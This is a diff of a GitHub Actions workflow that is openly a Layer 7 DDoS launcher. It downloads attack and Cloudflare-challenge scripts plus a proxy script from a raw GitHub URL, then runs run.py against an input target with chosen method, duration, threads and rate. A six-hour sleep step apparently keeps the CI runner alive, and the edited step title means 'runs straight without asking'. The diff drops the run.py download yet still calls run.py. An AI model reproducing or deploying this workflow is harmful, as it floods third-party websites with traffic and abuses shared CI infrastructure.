@@ -29,7 +29,8 @@ jobs:
       - name: Download tools
         run: |
           wget -q https://raw.githubusercontent.com/112jb/mlonghehe/main/cf.js
-          wget -q https://raw.githubusercontent.com/112jb/mlonghehe/main/run.py
+          wget -q https://raw.githubusercontent.com/112jb/mlonghehe/main/captcha.js
+          wget -q https://raw.githubusercontent.com/112jb/mlonghehe/main/uam.js
           wget -q https://raw.githubusercontent.com/112jb/mlonghehe/main/proxy.js
           chmod +x *
 
@@ -37,23 +38,9 @@ jobs:
         run: |
           node proxy.js
 
-      - name: Bắn Layer7 (FINAL 100% CHẠY)
+      - name: Bắn Layer7 (CHẠY THẲNG KHÔNG HỎI)
         run: |
-          cat > auto_input.txt << EOF
-          2
-          y
-          1
-          ${{ inputs.method }}
-          ${{ inputs.target }}
-          ${{ inputs.time }}
-          ${{ inputs.threads }}
-          ${{ inputs.rate }}
-          proxy.txt
-          EOF
-
-          nohup python3 run.py < auto_input.txt > attack.log 2>&1 &
-          sleep 5
-          tail -n 30 attack.log
+          python3 run.py 2 1 ${{ inputs.method }} ${{ inputs.target }} ${{ inputs.time }} ${{ inputs.threads }} ${{ inputs.rate }} proxy.txt
 
       - name: Keep alive
         run: sleep 21600
